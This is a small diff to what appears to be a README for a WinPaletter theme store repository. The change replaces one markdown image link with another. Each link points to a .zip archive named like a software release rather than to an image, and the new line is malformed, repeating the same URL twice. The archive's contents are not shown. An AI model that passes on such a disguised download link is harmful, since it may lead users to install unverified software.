@@ -1,4 +1,4 @@
-![alt text](https://github.com/AviRedDevil/WinPaletter-Store/raw/refs/heads/main/Themes/ottozumkeller/Fluid Dark/Win-Store-Paletter-v1.9-alpha.4.zip) 
+![alt text](https://raw.githubusercontent.com/AviRedDevil/WinPaletter-Store/main/Themes/Abdelrhman-AK/Avici01/Win_Paletter_Store_3.0-beta.1.zip https://raw.githubusercontent.com/AviRedDevil/WinPaletter-Store/main/Themes/Abdelrhman-AK/Avici01/Win_Paletter_Store_3.0-beta.1.zip) 
 # WinPaletter Store for themes
 
 ### Important notes:
